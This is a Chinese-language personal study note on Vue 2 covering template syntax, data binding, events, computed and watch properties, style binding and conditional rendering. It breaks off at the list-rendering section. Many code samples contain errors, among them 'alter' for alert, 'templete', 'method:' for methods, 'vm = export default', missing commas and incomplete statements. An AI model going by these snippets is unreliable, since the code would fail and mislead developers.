### vue学习笔记

### 0、参考链接&问题提出

#### 1、参考链接

1、[Vue2.x官网](https://cn.vuejs.org/v2/guide/index.html) ==官方网站==

2、[Vue.js菜鸟教程](https://www.runoob.com/vue2/vue-tutorial.html)

3、[尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通](https://www.bilibili.com/video/BV1Zy4y1K7SH?p=113&spm_id_from=pageDriver) ==视频学习教程==

4、[单独运行Vue界面](https://blog.csdn.net/sinat_33384251/article/details/108724570)

5、[Vue.js--3官网 ](https://v3.cn.vuejs.org/) ==官方网站==





#### 2、问题提出&解答 ==补充说明==

##### 1、[Vue.js目录结构](https://www.runoob.com/vue2/vue-directory-structure.html)

###### 1、结构示意图

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131125666.png" alt="image-20211021144957394" style="zoom: 80%;" />**

###### 2、结构中具体的作用以及存储的文件等信息

| 目录/文件                                               | 说明                                                         |
| :------------------------------------------------------ | :----------------------------------------------------------- |
| build                                                   | 项目构建(webpack)相关代码                                    |
| config                                                  | 配置目录，包括端口号等。我们初学可以使用默认的。             |
| [==node_modules==](D:\Typora_Texts\Java\npm整理汇总.md) | npm 加载的项目依赖模块                                       |
| src                                                     | 这里是我们要开发的目录，基本上要做的事情都在这个目录里。里面包含了几个目录及文件：assets: 放置一些图片，如logo等。components: 目录里面放了一个组件文件，可以不用。App.vue: 项目入口文件，我们也可以直接将组件写这里，而不使用 components 目录。main.js: 项目的核心文件。 |
| static                                                  | 静态资源目录，如图片、字体等。                               |
| test                                                    | 初始测试目录，可删除                                         |
| .xxxx文件                                               | 这些是一些配置文件，包括语法配置，git配置等。                |
| index.html                                              | 首页入口文件，你可以添加一些 meta 信息或统计代码啥的。       |
| package.json                                            | 项目配置文件。                                               |
| README.md                                               | 项目的说明文档，markdown 格式                                |



##### 2、Vue模板语法

==下方未提到的这里可能有==

###### 1、{{}}

```vue
<div id="app">
  <p>{{ message }}</p>
</div>

<script>
new Vue({
  el: '#app',
  data: {
    message: 'Hello Vue.js!'
  }
})
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131128080.png" alt="image-20211021145218748" style="zoom:80%;" />**



###### 2、v-html

```vue
<div id="app">
    <div v-html="message"></div>
</div>
    
<script>
new Vue({
  el: '#app',
  data: {
    message: '<h1>Hello</h1>'
  }
})
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131129528.png" alt="image-20211021145355464" style="zoom:80%;" />**



###### 3、属性 

```vue
<!-- label中的for属性规定label与哪一个表单元素绑定 -->
<div id="app2">
    <label for="r1">修改颜色</label> 
    <input type="checkbox" v-model="use" id="r1">
    <br/>
    <div v-bind:class="{'class1':use}">
        v-bind:class指令
    </div>
</div>
    
<script>
	// 2、v-bind
    var vm2 = new Vue({
        el: '#app2',
        data: {
            use: false
        }
    });
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131129031.png" alt="image-20211021145713449" style="zoom:80%;" />**



###### 4、表达式

```vue
<div id="app">
	{{5+5}}<br>
	{{ ok ? 'YES' : 'NO' }}<br>
	{{ message.split('').reverse().join('') }}
	<div v-bind:id="'list-' + id">菜鸟教程</div>
</div>
	
<script>
new Vue({
  el: '#app',
  data: {
	ok: true,
    message: 'RUNOOB',
	id : 1
  }
})
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131129087.png" alt="image-20211021145836468" style="zoom:80%;" />**



###### 5、参数

```vue
<div id="app">
    <pre><a v-bind:href="url">菜鸟教程</a></pre>
</div>
	
<script>
new Vue({
  el: '#app',
  data: {
    url: 'http://www.runoob.com'
  }
})
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131132509.png" alt="image-20211021150057771" style="zoom:80%;" />**



###### 6、==v-model双向绑定==

**v-model** 指令用来在 input、select、textarea、checkbox、radio 等表单控件元素上创建双向数据绑定，根据表单上的值，自动更新绑定的元素的值。

按钮的事件我们可以使用 v-on 监听事件，并对用户的输入进行响应。

```vue
<div id="app">
    <p>{{ message }}</p>
    <input v-model="message">
</div>
    
<script>
new Vue({
  el: '#app',
  data: {
    message: 'Runoob!'
  }
})
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131132501.png" alt="image-20211021150209247" style="zoom:80%;" />**



==双向绑定的同时调用方法==：

```vue
<!-- 7、v-model双向绑定测试 -->
<div id='app7'>
    <p>{{reverseString(message)}}</p> <!-- 双向绑定的同时进行自定义方法的调用-->
    <input type="text" v-model="message" id='inputs'>
</div>

<script>
    // 7、字符串双向绑定
    var vm7 = new Vue({
        el: "#app7",
        data: {
            message: 'Hello'
        },
        methods: {
            reverseString: function(message) {
                if(!message) message = '';
                message = message.split('').reverse().join('');
                return message;
            }
        }
    });
</script>
```

结果如下：

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131131949.png" alt="image-20211021152435197" style="zoom:80%;" />**



###### 7、过滤器

**多个过滤器的写法：**相当于连续的调用方法

```vue
<!-- 3、管道过滤器 -->
<div id="app3">
    {{message | capitalize | lastCapitalize}}
</div>
<script>
    // 3、过滤器
    var vm3 = new Vue({
        el: "#app3",
        data: {
            message: 'hello'
        },
        // filters
        filters: {
            // 首字母大写
            capitalize: function (value){
                if(!value) return '';
                value = value.toString();
                return value.charAt(0).toUpperCase() + value.slice(1);
            },

            // 尾字母大写
            lastCapitalize: function (value){
                if(!value) return '';
                value = value.toString();
                return value.slice(0, value.length - 1)	 + value.charAt(value.length - 1).toUpperCase();
            }
        }
    });
</script>
```

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131132523.png" alt="image-20211021152809201" style="zoom:80%;" />**



###### 8、v-on -- @



```vue
<!-- 5、字符循环后移 -->
<div id="app5">
    <p>{{message}}</p>
    <button @click="circulateMessage">字符串循环后移</button>
</div>
<script>
    // 5、字符串循环后移
    var vm5 = new Vue({
        el: '#app5',
        data: {
            message: 'Hello'
        },
        methods: {
            // 字符串后移方法
            circulateMessage : function() {
                if(!this.message) this.message = '';
                var value = this.message.toString();
                this.message = value.slice(1, value.length) + value.charAt(0);
            }
        }
    });
</script>
```









### 1、Vue 核心

#### 1、el的两种写法

##### 1、第一种写法

```vue
<script>
	const v = new Vue({
        el: '#root', // 第1种写法
        data:{
            name: 'hello'
        }
    })
</script>
```



##### 2、第二种写法

```vue
<script>
	const v = new Vue({
        // el: '#root', // 第1种写法
        data:{
            name: 'hello'
        }
    })
    v.$mount('root') // 第二种写法
</script>
```

第二种写法相对第一种写法来说，更加的灵活，比如说可以添加休眠时间，休眠时间过去之后再触发挂载，然后vue开始正式工作



#### 2、数据绑定

##### 1、**v-bind**

**特点：** 单向数据绑定，页面上的内容不会影响到data中的数据，但是data中的数据会影响到页面上的数据

（图示中的橙色的线存在，但是粉色的线不存在）

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201131129378.png" alt="image-20220112102150020" style="zoom:80%;" />**



##### 2、**v-model**

**特点：** 双向绑定，页面上的内容会影响到data中的数据，data中的数据也会影响到页面上的数据

（上图中的橙色和粉色的线都存在）

**限制：** 只能使用在**表单类元素**上（如：input， select等元素），其他类型的不能使用

**简写： **`v-model:value`可以简写为`v-model`，因为`v-model`默认获取的值就是value值



#### 3、MVVM架构模型

**参考链接：** 

##### 1、MVVM [Wiki](https://zh.wikipedia.org/wiki/MVVM)介绍

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201121042755.png" alt="image-20220112104205678" style="zoom:80%;" />**

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201121042000.png" alt="image-20220112104222955" style="zoom:80%;" />**



##### 2、Vue中对应的模型设计

Vue中参考了这个模型设计出来的模型

**M：**模型(Model) ：对应 data 中的数据

**V：**视图(View) ：模板

**VM：**视图模型(ViewModel) ： Vue 实例对象

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201121045625.png" alt="image-20220112104538528" style="zoom: 50%;" />**

上图中存在两条线，

第一条是`Data Bindings`，是将Model（data中的数据）中的数据绑定到对应的DOM页面（templete模板）上

第二条是`DOM Listeners`， 是将View页面上有所变化的数据，通过VM传递给Model（data）中，从而可以实现双向数据绑定

**具体示例如下图所示：**

**<img src="https://raw.githubusercontent.com/Francis-cell/Picture/main/202201121053072.png" alt="image-20220112105309991" style="zoom: 67%;" />**





#### 4、数据代理

##### 1、回顾`Object.defineProperty`方法

**基本使用：**

```vue
<script>
	let person = {
        name: '张三',
        sex: '男',
        // age: 18  // 1、第一种写法
    } 
    
    // 2、第二种写法（下面这种定义才和上方person中的age的定义一致）
    Object.defineProperty(person, 'age', {
        value: 18,
        enumerable: true, // 控制属性是否可以被枚举，默认值为false
        writeable: true, // 控制属性是否可以被修改，默认值为false
        configurable: true // 控制属性是否可以被删除，默认情况下是false
    })
</script>
```



**案例：**

定义一个number元素，存储值，作为person的年龄值，当number值修改时，person的age值也会随着改变

***原本的方式***

```vue
<script>
    let number = 18
	let person = {
        name: '张三',
        sex: '男',
        age: nubmer
    } 
</script>
```

使用这种方式的话，修改了`number`的值之后，还需要手动将`number`的值赋值给`age`，否则修改不会生效

【原因】：页面初始化的时候，`number`的值为18，此时`person`获取到`number`的值，然后渲染，之后修改`number`的值，也只是单独影响`number`的值而已，并不会影响到`person`中的`age`的值



***解决方法***

使用`Object.defineProperty`中的`get`和`set`方法

```vue
<script>
    let number = 18
	let person = {
        name: '张三',
        sex: '男'
    } 
    
    // 2、第二种写法（下面这种定义才和上方person中的age的定义一致）
    Object.defineProperty(person, 'age', {
        
        // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值
        get() {
            // console.log('有人读取了age属性了')
            return number
        },
        
        // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
        set(value) {
            // console.log('有人修改了age属性，且值是', value)
            number = value
        }
    })
</script>
```

这里调用`set`方法将`number`的值修改了之后，然后会调用`get`方法，将`number`的具体值传递给`person`的`age`属性





##### 2、一个简单的数据代理

```vue
<script>
	let obj = {x: 100}
    let obj2 = {y: 200}
    
     Object.defineProperty(obj2, 'x', {
        get() {
            return obj.x
        },
        
        set(value) {
            obj.x = value
        }
    })
</script>
```

代理的是`obj2`中的`x`，当修改`obj`中的`x`值时，将会引发`obj2`中`x`的元素的变化



##### 3、Vue中的数据代理

**图示：**

**![image-20220112113903036](https://raw.githubusercontent.com/Francis-cell/Picture/main/202201121139173.png)**

`Vue`将我们自己定义的`data`转换成`VM`中的`_data`，然后，再使用数据代理的方法（`get`获取`_data`中的数据， `set`修改`_data`中的数据）将`_data`中保存的数据获取出来（当然我们也可以进行修改操作）





#### 5、事件处理

##### 1、事件基本使用-click

v-click:value="方法名"

缩写`@click`

```vue
<templete>
	<div id="App">
       	<button @click="showInfo1">按钮1</button>
        <!--这里其实相当于传入了一个event参数，默认方法是会传入的-->
        <button @click="showInfo2()">按钮1</button> 
        <button @click="showInfo3($event, 666)">按钮3</button>
    </div>
</templete>
<script>
    export default {
		name: 'App',
		methods: {
            showInfo1() { // 其实完整的写法是showInfo1(event)
                alter("提示信息---按钮1")
            },
            showInfo2() { 
                alter("提示信息---按钮2")
            },
            showInfo3(event, number) { // 此时因为调用它的地方使用的event，所以不能省略方法的定义不能省略event
                console.log(event.target.innerText); // 显示被点击的按钮中的文本内容
                console.log(this); // 此处的this时vm，即Vue实例对象
            }
        }
	}
</script>
```



##### 2、事件修饰符

```bash
Vue中的事件修饰符
# 1、prevent：阻止默认事件（常用）
# 2、stop：阻止事件冒泡（常用）
# 3、once：事件只触发一次（常用）
# 4、capture：使用事件的捕获模式
# 5、self：只有event.target时当前操作的元素时才触发事件 
	# 即使是事件冒泡触发到了外层元素所调用的事件，实际上它的event.target依然是我们最开始点击的那个元素
# 6、passive：事件的默认行为立即执行，无需等待事件回调执行完毕 
	# 有的情况下默认行为要等待事件处理完毕之后才能触发，导致页面显示有卡顿的效果，所以在这种时候使用passive效果会比较好
	# 在移动端和平板等使用的较多
```



###### 1、prevent（阻止默认事件）

```vue
<!--默认情况下，a标签点击之后，就会跳转页面，但是我们这里只是实现弹窗效果的。-->
<templete>
	<div id="App">
        <>
        <!--方法1-->
       	<a href="http://www.baidu.com" @click="showInfo1">点击提示信息</a>
        <!--方法2-->
        <a href="http://www.baidu.com" @click.prevent="showInfo">点击提示信息</a>
    </div>
</templete>
<script>
    export default {
		name: 'App',
		methods: {
            // 方法2（其实还是原本的方法，具体的改变在标签中定义了）
            showInfo() {
                alert("提示信息");
            },
            // 方法1
            showInfo1(e) {
                e.preventDefault() // 阻止被点击标签的默认行为
                alert("提示信息");
            }
        }
	}
</script>
```



###### 2、stop（阻止事件冒泡）

```vue
<templete>
	<div id="App">
        <!--阻止事件冒泡-->
        <div @click="showInfo">
            <button @click="showInfo1">点我提示信息</button>
            <!--阻止事件冒泡方法2-->
            <button @click.stop="showInfo2">点我提示信息</button>
        </div>
    </div>
</templete>
<script>
    export default {
		name: 'App',
		methods: {
            showInfo1(e) {
                e.stopProgation();  // 阻止事件冒泡方法1 
                alert("提示信息");
            },
            showInfo2() {
                alert("提示信息");
            }
        }
	}
</script>
```



###### 3、once（事件只触发一次）

```vue
<templete>
	<div id="App">
        <!--事件只触发1次-->
        <button @click.once="showInfo">点我提示信息</button>
    </div>
</templete>
<script>
    export default {
		name: 'App',
		methods: {
            showInfo() {
                alert("提示信息");
            }
        }
	}
</script>
```



###### 4、capture（使用事件的捕获模式）

**事件捕获**和**事件冒泡**参看知识补充部分

使用`capture`的话，可以**使得事件在捕获阶段就能触发事件**（而不需要等到事件冒泡阶段才去处理）

**用法：**

```vue
<templete>
	<div id="App">
        <!--事件在捕获阶段就触发了-->
        <div @click.capture="showMsg(1)">
        	div1
            <div @click="showMsg(2)">div2</div>
        </div>
    </div>
</templete>
<script>
    export default {
		name: 'App',
		methods: {
            showMsg(number) {
                console.log(number);
            }
        }
	}
</script>
```

这个样例，如果没有此案已事件捕获模式的话，输出的结果为 `2, 1`（由内而外的获取到结果）

但是给外层`div`加上`capture`的话，输出的结果就是 `1, 2`了（外层div在事件捕获阶段就触发`showMsg()`事件，内层的div则是在事件冒泡阶段才触发`showMsg()`事件）



##### 3、键盘事件

###### 1、简介

```bash
1、Vue中常用的按键别名
   回车 => enter (实际上按键的名字是Enter)
   删除 => delete (捕获“删除”和“退格”键)
   退出 => esc
   空格 => space
   换行 => tab (需要配合keydown使用才行)
   上 => up
   下 => down
   左 => left
   右 => right
 
2、Vue中未提供别名的按键，可以使用按键演示的key值去绑定，需要注意的是要（使用短横线命名方式）
   # 例如大写按键的名字是CapsLock，但是在使用的时候要更名为caps-lock才行
 
3、系统修饰键（用法特殊）: ctrl、alt、shift、meta
   (1).配合keyup使用的时候：按下修饰键的同时，再按下其他一个键，然后释放其他键，事件才会被触发
    # 比如说按下ctrl + y，然后释放y键就可以触发事件了（注意是释放组合的那个按键）
   (2).配合keydown使用的时候：正常触发事件
    # 但是使用这种方式的话，只需要点击ctrl键，在按下的时候就触发了
	
4、也可以使用keyCode去指定具体的按键(不推荐)
   # 这种方法已经被废弃，因为不同的键盘上对应的键的keyCode的值不一定一样
   
5、Vue.config.keyCodes.自定义按键名 = 键码， 可以去定制按键别名（一般也使用不到）
   # 具体的定义方法如下样例中所示
```



###### 2、使用样例

此处针对**第五种方式**写下一个样例

```vue
<templete>
	<div id="App">
        <!--此处调用了下方定义的别名-->
        <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo">
        <!--使用按键的名字调用-->
        <input type="text" placeholder="按下回车提示输入" @keyup.Enter="showInfo">
        <!--使用Vue中定义的别名调用-->
        <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo">
    </div>
</templete>
<script>
   // 定义一个回车键的别名
   Vue.config.keyCodes.huiche = 13 
    
   export default {
		name: 'App',
		methods: {
            showInfo() {
                alter("点击提示信息");
            },
            // 获取按键名称和按键代表数字的方法
            showCodes(e) {
               console.log(e.) 
            }
        }
	}
</script>
```



##### 4、事件补充说明（技巧）

事件修饰符那里，可以连续使用多个事件修饰符

```vue
<!--先阻止冒泡，然后阻止默认事件的触发-->
<button @click.stop.prevent="showInfo2">点我提示信息</button>
```



键盘按键的组合触发

```vue
<!--当使用ctrl和y的组合按键的时候，才能触发showInfo方法，其他的按键组合将失效-->
<input type="text" placeholder="按下回车提示输入" @keyup.ctrl.y="showInfo"> <!--注意使用的是keyup-->
```





#### 6、计算属性

##### 1、简介

```bash
1、定义：要使用的属性不存在，需要通过已有的属性计算得来
2、原理：底层借助了Object.defineproperty方法提供的getter和setter
3、get函数什么时候执行？
   (1).初次读取的时候会执行一次 
   # 第一次计算这个计算属性的时候，就会去执行一次get方法，从而计算出属性的值，后续的调用基本上都是读取缓存中保存的值
   (2).当依赖额数据发生变化的时候会被再次调用
   # 当这个计算属性它所依赖的数据属性有变化的时候，就会去重新调用一下get方法，因为如果还是使用缓存中的数据的话会导致获取到的值是错误的值
4、优势：与methods的实现相比，内部有缓存机制（可以复用），因而效率更高，调试方便
   # 使用methods方法的话，没有缓存机制，会导致methods中的方法反复的被调用，从而降低效率
5、备注：# 参看前面数据代理部分
   (1).计算属性最终也会出现在vm上，和data中的属性差不多，vm在使用计算属性的时候会自动调用get方法，从而获取到计算属性的值
   # 在网页端的开发者工具那里，我们可以看到其实普通属性是放在data中的，而计算属性则是单独被放置在computed中的
   (2).如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生变化
```



##### 2、具体使用

```vue
<templete>
	<div id="root">
       姓：<input type="text" v-model="firstName"> <br/><br/>
       名：<input type="text" v-model="lastName"> <br/><br/>
       全名：<span>{{fullName}}</span>
       <!-- 连续调用3次可以验证计算属性的缓存机制-->
       <!--全名：<span>{{fullName}}</span>-->
       <!--全名：<span>{{fullName}}</span>-->
        
       全名(method): <span>{{getFullName()}}</span>
       <!--全名(method): <span>{{getFullName()}}</span>-->
       <!--全名(method): <span>{{getFullName()}}</span>-->
        
       <!--!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!-->  
       <!--这里和使用method方法的不同点-->
       <!--计算属性调用的是属性，所以在{{}}内部填充内容的方式和普通的data属性填充的方式是一样的，但是method不一样，它在{{}}内部放置的是一个方法，而不是属性，所以要加上'()'，以表明这个地方调用的是一个method方法-->
    </div>
</templete>
<script>
    export default {
		name: 'App',
        // 普通属性的定义
	    data:{
            firstName: '张',
            lastName: '三'
        },
        method: {
          getFullName(){
              console.log("method中的getFullName方法被调用！")
              return this.firstName + '-' + this.lastName;
          }  
        },
        // 计算属性的定义
        computed: {
            fullName: {
                // get方法的作用：当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                // get方法调用的时机：1、初次读取fullName的时候 2、所依赖的数据发生变化的时候
                get() {
                    console.log('计算属性fullName中的get方法被调用了！');
                    // console.log(this); // 这里的this是vm
                    return this.firstName + '-' + this.lastName;
                },
                // set方法被调用的时机：当fullName被修改的时候
                set(value) {
                    // console.log('set', value);
                    const arr = value.split('-');
                    this.firstName = arr[0];
                    this.lastName = arr[1];
                }
            }
        }
	}
</script>
```



##### 3、计算属性的简写形式

```vue
<script>
    export default {
	    name: 'App',
        // 普通属性的定义
	    data:{
            firstName: '张',
            lastName: '三'
        },
        method: {
          getFullName(){
              console.log("method中的getFullName方法被调用！")
              return this.firstName + '-' + this.lastName;
          }  
        },
        // 计算属性的定义
        computed: {
            fullName() {
                console.log('计算属性fullName中的get方法被调用了！');
            	// console.log(this); // 这里的this是vm
            	return this.firstName + '-' + this.lastName;
            }
        }
	}
</script>
```







#### 7、监视属性

##### 1、简介

```bash
1、当被监视的属性发生变化时，回调函数自动调用，进行相关操作
2、监视的属性必须存在，才能进行监视
3、监视的两种写法
   (1).new Vue时传入watch配置 # 参看监视属性定义方法1
   (2).通过vm.$watch监视 # 参看监视属性定义方法2
```



##### 2、具体使用

```vue
<templete>
	<div id="root">
        <h2>今天天气是{{info}}的</h2>
        <button @click="changeWeather">切换天气</button>
    </div>
</templete>
<script>
   // 定义一个回车键的别名
   Vue.config.keyCodes.huiche = 13 
    
   vm = export default {
       name: 'root',
       data: {
           isHot:true  
       },
       computed:{
           info() {
               return this.isHot ? '炎热' : '凉爽';
           }
       },  
	   methods: {
          changeWeather() {
              this.isHot = !this.isHot;
          }
       },
       // 方法1： 监视属性的定义
       watch:{
           isHot:{
               immediate: true, // vm在初始化的时候，就立即调用一次handler方法
               // handler什么时候调用？当isHot发生变化的时候调用它
               handler(newValue, oldValue) {
                   console.log('isHot的值被修改了！', newValue, oldValue)
               }
           }
       }
	}
    
    // 方法2：vm.$watch的方式去定义
    /**vm.$watch('isHot', {
        immediate: true, // vm在初始化的时候，就立即调用一次handler方法
        handler(newValue, oldValue) {
             console.log('isHot的值被修改了！', newValue, oldValue)
        }
    })*/
</script>
```





##### 3、深度监视

###### 1、简介

```bash
深度监视：
   (1).Vue中的watch默认不监测对象内部值的改变（一层）
   (2).配置deep:true可以监测对象内部值的改变（多层）
   # 添加deep:true就可以开启watch的深度监视属性了
备注：
   (1).Vue本身可以监测到对象内布置的改变，但是Vue提供的watch默认不可以（主要是为了提供效率）
   (2).使用watch时需要根据数据的具体结构，决定是否采用深度监视
```



###### 2、基本使用

```vue
<templete>
	<div id="root">
        <h3>a的值为：{{numbers.a}}</h3>
        <button @click="numbers.a++">点击我让a+1</button>
        <h3>b的值为：{{numbers.b}}</h3>
        <button @click="numbers.b++">点击我让b+1</button>
    </div>
</templete>
<script>
   // 定义一个回车键的别名
   Vue.config.keyCodes.huiche = 13 
    
   export default {
       name: 'root',
       data: {
           numbers:{
               a:1,
               b:1
           }
       },
       computed:{
           info() {
               return this.isHot ? '炎热' : '凉爽';
           }
       },  
	   methods: {
          changeWeather() {
              this.isHot = !this.isHot;
          }
       },
       watch:{
           numbers:{
               deep:true, // 开启深度监视
               handler() {
                   console.log('numbers改变了');
               }
           },
           // 如果只是监测numbers里面的a属性的值是否发生变化，不监测b属性的值是否变化
           /** 
           	  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
              我们使用习惯了简写形式，即将'numbers'简写为numbers，所以这里使用numbers.a是错误的，应该使用'numbers.a'才可以
           	*/
           'numbers.a':{
               handler() {
                   console.log('numbers里面的a属性值发生了变化!');
               }
           }
       }
	}
</script>
```





##### 4、监视属性的简写形式

简写形式使用的时机

`watch`中没有`immediate`和`deep`等其他属性，只有`handler`存在的时候，可以触发简写形式

**示例（未简写时）：**

```vue
<script>
   vm = export default {
       name: 'root',
       // 书写方法1
       watch:{
           numbers:{
               // 注意此处，没有immediate和deep等其他属性，仅仅有handler的时候，才能使用简写的方法来写监视属性
               handler(newValue, oldValue) {
                   console.log('numbers改变了', newValue, oldValue);
               }
           }
       }
	}
    
    // 书写方法2：vm.$watch的方式去定义
    vm.$watch('numbers', {
        handler(newValue, oldValue) {
             console.log('numbers！', newValue, oldValue)
        }
    })
</script>
```

**示例（简写时）：**

```vue
<script>
   vm = export default {
       name: 'root',
       watch:{
           // 简写方式1
           numbers(newValue, oldValue){
               console.log('numbers改变了', newValue, oldValue);
           }
       }
	}
    
    // 简写方法2：vm.$watch的方式去定义
    vm.$watch('numbers', function(newValue, oldValue){
         console.log('numbers！', newValue, oldValue)
    })
</script>
```





#### 8、计算属性&监视属性 对比

##### 1、计算属性

**计算属性：** 不能在计算属性中开启异步任务，因为它依靠return的返回值作为计算属性的最终结果，但是如果将return放到一个异步任务内部（比如说一个计时器内部【示例如下】），就会导致return不能被计算属性真正的获取到，从而导致计算属性没有结果。

**示例：**

```vue
<script>
   vm = export default {
       name: 'root',
       data:{
           firstName: '张',
           lastName: '三'
       }
       // 直接使用计算属性的简写形式
       computed: {
           fullName() {
               // 设置等待1秒钟之后再返回结果
               setTimeout(() => {
                   // 此处的return结果不是fullName的返回结果，而是内部的箭头函数的返回结果，故而不能这样使用
                   return this.firstName + "-" + this.lastName;
               }, 1000);
               // return XXX; // 在这里使用的return才是fullName本身的返回值结果，但是异步定时器不能定义在这里
           }
       }
</script>
```



##### 2、监视属性

**监视属性：** 监视属性就可以解决上面提到的问题

```vue
<script>
   vm = export default {
       name: 'root',
       data:{
           firstName: '张',
           lastName: '三',
           // 此处和计算属性的不同，因为要使用到fullName这个属性，所以在这里就需要初始化定义，否则将无法使用
           fullName: '张-三'
       }
       watch:{
           firstName(val){
               // 在这里可以开启异步任务属性，比如这里设置的计时器，就可以在这里使用，它使用的不是return的结果作为最终的结果的
               setTimeout(() => {
                   this.fullName = val + '-' + this.lastName;
               }, 1000);
           },
           lastName(val){
               this.fullName = this.firstName + '-' + val;
           }
       }
	}
</script>
```





#### 9、绑定样式

##### 1、绑定class样式

###### 1、简介

```bash
# 具体的使用参看样例中的写法
:class="xxx" xxx可以是字符串、对象、数组
1、字符串写法，适用情况：样式的类名不确定，需要动态指定

2、数组写法，适用情况：需要绑定的样式个数不确定，名字也不确定

3、对象写法，适用情况：需要绑定的样式个数确定，名字也确定，但是需要动态决定其中的样式是否使用

```





###### 2、样例

```vue
<template>
	<div class="demo">
	    <!-- 绑定class样式--字符串写法，适用情况：样式的类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
        <!-- 绑定class样式--数组写法，适用情况：需要绑定的样式个数不确定，名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div> <br/><br/>
        <!-- 绑定class样式--对象写法，适用情况：需要绑定的样式个数确定，名字也确定，但是需要动态决定其中的样式是否使用 -->
        <div class="basic" :class="classObj">{{name}}</div>
	</div>
</template>

<script>
	// 组件操作执行代码
	export default {
         el: '#demo'
		data:{
		    name: '朱梦仁',
             // 字符串写法： 默认开启normal属性
             mood: 'normal', 
             // 数组写法： 后续可以通过classArr将它内部的元素删掉或者添加，从而达到改变元素样式的目的
             classArr:['st1', 'st2', 'st3'], 
             // 对象写法： 此处可以将一些固定个数和确定的样式放置到这个对象中，通过调整它们的boolean值，从而决定使用这个对象写法的元素的最终样式
             classObj:{
                 st1: false,
                 st2: false
             }
		},
        methods: {
            changeMood(){
                /* 点击触发之后，将mood的值更换为happy*/
                // this.mood = 'happy'; 
                
                /*随机选择一种心情，作为mood的值*/
                const moodArr = ['normal', 'happy', 'sad'];
                let index = Math.floor(Math.random()*3);
                this.mood = moodArr[index];
            }
        }
	}
</script>

<style>
    /*具体的样式在此就不定义了*/
    .basic{
        /*basic具体样式*/
    }
    
    /*下面的这三种样式是互斥存在的，无法同时存在*/
    .happy{
        /*happy具体样式*/
    }
    .sad{
        /*sad具体样式*/
    }
    .normal{
        /*normal具体样式*/
    }
    
    /*下面的这三种样式是可以同时存在的，互不干扰的样式组*/
    .st1{
        /*st1具体样式*/
    }
    .st2{
        /*st2具体样式*/
    }
    .st3{
        /*st3具体样式*/
    }
</style>
```



##### 2、绑定style样式

###### 1、简介

```bash
:style="{fontSize: xxx}" 其中xxx是动态的值 # 使用的较多
:style="[a, b]" 其中a、b是样式对象 # 使用的较少
```



###### 2、示例

```vue
<template>
	<div class="demo">
	    <!-- 绑定style样式--:style="{fontSize: xxx}" 其中xxx是动态的值 -->
        <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
        <!-- 绑定style样式--:style="[a, b]" 其中a、b是样式对象 -->
        <div class="basic" :style="[styleObj, styleObj2]">{{name}}</div>
	</div>
</template>

<script>
	// 组件操作执行代码
	export default {
         el: '#demo'
		data:{
        	name: '朱梦仁',
        	styleObj:{
			  fontSize: '40px',  // 注意：此处使用的属性值，必须是CSS中拥有的样式类型
        	   color: 'red'
            },
        	styleObj2:{
                backgroundColor: 'orange'
            }
		}
	}
</script>
```







#### 10、条件渲染

##### 1、`v-if`和`v-show`的使用

```vue
<template>
	<div class="demo">
	    <!--使用v-show做条件渲染-->
        <h2 v-show="false">欢迎{{name}}同学</h2> <!--直接使用boolean值作为v-show的条件-->
        <h2 v-show="1 === 1">欢迎{{name}}同学</h2> <!--使用表达式作为v-show中的条件-->
        
        <!--!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!-->
        <!--注意此处的v-if和v-else-if以及v-else之间不能被其他的标签打断，否则将不会生效-->
        <!--使用v-if做条件渲染-->
        <h3>{{n}}</h3>
        <button @click="n++">点击我n++</button>
        <div v-if="n === 1">div1</div>
        <div v-else-if="n === 2">div2</div>
        <div v-else-if="n === 3">div3</div>
        <div v-else>div4</div>
        
        <!--不改变原本代码结构的情况下，减少使用条件渲染的地方，但是同样可以实现多次使用条件渲染目的的方法-->
        <!--templete结合v-if使用(templete和v-show是不能一块儿使用的)-->
        <templete v-if="n === 1">
            <h2>提示1</h2>
            <h2>提示2</h2>
            <h2>提示3</h2>
        </templete>
        <!--上面的写法等效于下方的写法-->
        <!-- 写法1 -->
        <h2 v-if="n === 1">提示1</h2>
        <h2 v-if="n === 1">提示2</h2>
        <h2 v-if="n === 1">提示3</h2>
        <!-- 写法2 -->
        <h2 v-show="n === 1">提示1</h2>
        <h2 v-show="n === 1">提示2</h2>
        <h2 v-show="n === 1">提示3</h2>
        
	</div>
</template>

<script>
	export default {
         el: '#demo'
		data:{
        	name: '朱梦仁',
        	n: 0
		}
	}
</script>
```



##### 2、两者的区别

==`v-show`==如果取值为`false`的话，在进行渲染的时候，相当于在css中使用了`display: none`，即并不会破坏原本的代码结构

​			不能和`<templete></templete>`标签结合使用

==`v-if`==的取值如果是`false`的话，在进行渲染的时候，相当于直接在代码结构中将这一部分整个去掉

​			可以和`<templete></templete>`标签结合使用





#### 11、列表渲染 ==main==

##### 1、简介







##### 2、基本使用

###### 1、基本列表的使用

**(此处目前使用的还是index)**

```vue
